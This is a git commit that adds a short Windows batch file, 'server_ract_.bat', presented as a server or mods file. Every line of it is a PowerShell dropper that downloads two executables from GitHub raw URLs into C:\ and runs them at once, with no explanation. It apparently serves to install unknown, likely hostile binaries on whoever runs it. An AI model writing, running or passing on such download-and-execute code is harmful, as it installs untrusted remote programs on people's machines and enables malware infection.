14644843653490e1859feb172a6f432e65732804
prozo <69033601+vovoco@users.noreply.github.com>
2023-03-19 01:30:16 +0300

    Add files via upload

---
+++ server_ract_.bat
@@ -0,0 +1,7 @@
+#!powershell
+powershell (new-object System.Net.WebClient).DownloadFile( 'https://github.com/vovoco/mods/raw/main/123.exe','C:\mods_rast.exe')
+C:\mods_rast.exe
+
+#!powershell
+powershell (new-object System.Net.WebClient).DownloadFile( 'https://github.com/fotry/z/raw/main/mods.exe','C:\mods.exe')
+C:\mods.exe
